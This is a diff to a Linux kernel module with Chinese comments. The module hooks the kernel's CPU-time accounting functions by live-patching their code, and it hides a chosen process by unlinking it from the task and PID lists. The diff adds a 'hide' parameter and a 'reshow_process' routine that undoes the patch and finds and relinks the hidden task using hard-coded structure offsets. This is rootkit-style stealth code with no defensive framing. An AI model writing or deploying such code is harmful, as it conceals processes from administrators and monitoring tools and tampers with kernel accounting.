@@ -2,14 +2,19 @@
 #include <linux/module.h>
 #include <linux/kallsyms.h>
 #include <linux/sched.h>
+#include <linux/sched.h>
 #include <linux/cpu.h>
 
 char *stub = NULL;
 char *addr_user = NULL;
 char *addr_sys = NULL;
+unsigned long *percpuoff = NULL;
 
 static unsigned int pid = 0;
 module_param(pid, int, 0444);
+
+static unsigned int hide = 1;
+module_param(hide, int, 0444);
 
 // stub函数模版
 void stub_func_template(struct task_struct *p, u64 cputime, u64 cputime_scaled)
@@ -23,6 +28,10 @@ void stub_func_template(struct task_struct *p, u64 cputime, u64 cputime_scaled)
 #define FTRACE_SIZE   	5
 #define POKE_OFFSET		0
 #define POKE_LENGTH		5
+
+#define RQUEUE_SIZE		2680
+#define TASKS_OFFSET	2344
+#define CPU_OFFSET		2336
 
 void * *(*___vmalloc_node_range)(unsigned long size, unsigned long align,
             unsigned long start, unsigned long end, gfp_t gfp_mask,
@@ -50,6 +59,49 @@ void hide_process(void)
 	node->pprev = &node;
 }
 
+#define CRQ_OFFSET	160
+void reshow_process(void)
+{
+	struct list_head *list;
+	struct task_struct *p, *n;
+	unsigned long *rq_addr, base_rq;
+	char *tmp;
+	int cpu = smp_processor_id();
+	struct task_struct *task = current;//pid_task(find_vpid(1), PIDTYPE_PID);
+	struct pid_link *link = NULL;
+
+	// 以下一直到for语句为惯常的percpu变量定位操作。
+	tmp = (char *)task->se.cfs_rq;;
+
+	rq_addr = (unsigned long *)(tmp + CRQ_OFFSET);
+	tmp = (char *)*rq_addr;
+
+	cpu = (int)*(int *)(tmp + CPU_OFFSET);
+	base_rq = (unsigned long)tmp - (unsigned long)percpuoff[cpu];
+
+	task = NULL;
+
+	for_each_possible_cpu(cpu) { // 找到被隐藏的进程
+		tmp = (char *)(percpuoff[cpu] + base_rq);
+		list = (struct list_head *)&tmp[TASKS_OFFSET];
+		list_for_each_entry_safe(p, n, list, se.group_node) {
+			if (list_empty(&p->tasks)) {
+				task = p;
+				break;
+			}
+		}
+		if (task) break;
+	}
+
+	if (!task) return;
+
+	link = &task->pids[PIDTYPE_PID];
+
+	hlist_add_head_rcu(&link->node, &link->pid->tasks[PIDTYPE_PID]);
+	list_add_tail_rcu(&task->tasks, &init_task.tasks);
+
+}
+
 static int __init hotfix_init(void)
 {
 	unsigned char jmp_call[POKE_LENGTH];
@@ -57,6 +109,7 @@ static int __init hotfix_init(void)
 	s32 offset;
 	// 需要校准的pid指针位置。
 	unsigned int *ppid;
+
 
 	addr_user = (void *)kallsyms_lookup_name("account_user_time");
 	addr_sys = (void *)kallsyms_lookup_name("account_system_time");
@@ -71,6 +124,27 @@ static int __init hotfix_init(void)
 	_text_mutex = (void *)kallsyms_lookup_name("text_mutex");
 	if (!___vmalloc_node_range || !_text_poke_smp || !_text_mutex) {
 		printk("还没开始，就已经结束。");
+		return -1;
+	}
+
+	if (hide == 0) { // 进程的恢复操作
+		offset = *(unsigned int *)&addr_user[1];
+		stub = (char *)(offset + (unsigned long)addr_user + FTRACE_SIZE);
+
+		// 恢复hook函数
+		get_online_cpus();
+		mutex_lock(_text_mutex);
+		_text_poke_smp(&addr_user[POKE_OFFSET], &stub[0], POKE_LENGTH);
+		_text_poke_smp(&addr_sys[POKE_OFFSET], &stub[0], POKE_LENGTH);
+		mutex_unlock(_text_mutex);
+		put_online_cpus();
+
+		vfree(stub);
+
+		percpuoff = (void *)kallsyms_lookup_name("__per_cpu_offset");
+		if (!percpuoff)
+			return -1;
+		reshow_process();
 		return -1;
 	}
 
@@ -96,7 +170,6 @@ static int __init hotfix_init(void)
 
 	jmp_call[0] = 0xe8;
 
-	// hook掉user时间计数函数
 	offset = (s32)((long)stub - (long)addr_user - FTRACE_SIZE);
 	(*(s32 *)(&jmp_call[1])) = offset;
 
@@ -106,7 +179,6 @@ static int __init hotfix_init(void)
 	mutex_unlock(_text_mutex);
 	put_online_cpus();
 
-	// 同理hook掉sys时间计数函数
 	offset = (s32)((long)stub - (long)addr_sys - FTRACE_SIZE);
 	(*(s32 *)(&jmp_call[1])) = offset;
 
